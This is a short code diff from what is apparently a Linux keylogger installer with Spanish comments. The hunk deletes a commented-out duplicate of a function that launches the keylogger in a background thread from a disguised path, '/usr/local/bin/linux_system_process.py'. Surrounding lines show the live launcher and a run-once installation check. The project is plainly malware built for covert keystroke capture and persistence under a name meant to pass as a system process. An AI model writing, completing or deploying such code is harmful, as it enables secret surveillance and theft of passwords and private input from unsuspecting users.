@@ -144,22 +144,6 @@ def execute_keylogger_immediately():
     except Exception as e:
         print(f"Failed to execute the keylogger: {e}")
 
-
-
-
-# Función para ejecutar el keylogger inmediatamente
-#def execute_keylogger_immediately():
- #   dest_path = "/usr/local/bin/linux_system_process.py"
-  #  try:
-        # Ejecutar el keylogger en un hilo separado para que no bloquee
-   #     keylogger_thread = threading.Thread(target=lambda: subprocess.run(['python3', dest_path]))
-    #    keylogger_thread.start()
-    #    print("Keylogger executed immediately.")
-    #except Exception as e:
-     #   print(f"Failed to execute the keylogger: {e}")
-
-
-
 # ---- Instalación ----
 # 1. Verificar si ya se ejecutó previamente (flag)
 if check_flag():
